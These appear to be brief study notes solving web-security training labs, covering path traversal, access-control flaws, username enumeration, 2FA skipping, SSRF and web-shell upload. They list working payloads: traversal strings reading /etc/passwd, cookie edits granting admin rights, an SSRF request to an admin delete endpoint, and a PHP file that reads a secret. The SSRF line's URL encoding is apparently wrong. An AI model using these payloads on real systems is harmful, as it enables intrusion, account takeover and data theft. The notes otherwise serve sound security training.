## Reading arbitrary files via path traversal

`https://insecure-website.com/loadImage?filename=../../../etc/passwd`  
`https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini`

## Lab: File path traversal, simple case
`/image?filename=../../../etc/passwd`

## Lab: Unprotected admin functionality
`/robots.txt`

## Lab: Unprotected admin functionality with unpredictable URL
Admin URL in `<script>` tag.

## Lab: User role controlled by request parameter
Change Cookie: `Admin=true`

## Lab: User ID controlled by request parameter, with unpredictable user IDs

1. Find a post of Carlos;
2. Find Carlos' UID in html;
3. Change id cookie to Carlos' UID


## Lab: User ID controlled by request parameter with password disclosure
1. Login in Wiener's account;
2. Open MyAccount page with cookie `id=administrator`;
3. Get administrator's password;
4. Delete Carlos.

## Lab: Username enumeration via different responses
Intrude. (wihout Pro filter is really shxxxxt.)


## Lab: 2FA simple bypass
Login with password, just skip the 2FA page (change URL).


## Lab: Basic SSRF against the local server

Intercept Stock check request and change the stockApi to `http%4A%2F%2Flocalhost%2Fadmin%2Fdelete%3Fusername%3Dcarlos`

## Lab: Basic SSRF against another back-end system
1. First iterate stockAPI to find the admin url
2. check `Lab: Basic SSRF against the local server`

## Lab: Remote code execution via web shell upload
1. Upload a php file contains:  
    `<?php echo file_get_contents('/home/carlos/secret'); ?>`
2. Visit `https://host/files/avatars/filename.php`.


## Web shell upload via Content-Type restriction bypass
Basically same as `Lab: Remote code execution via web shell upload` just change the php file's Content-Type to image/jpeg.
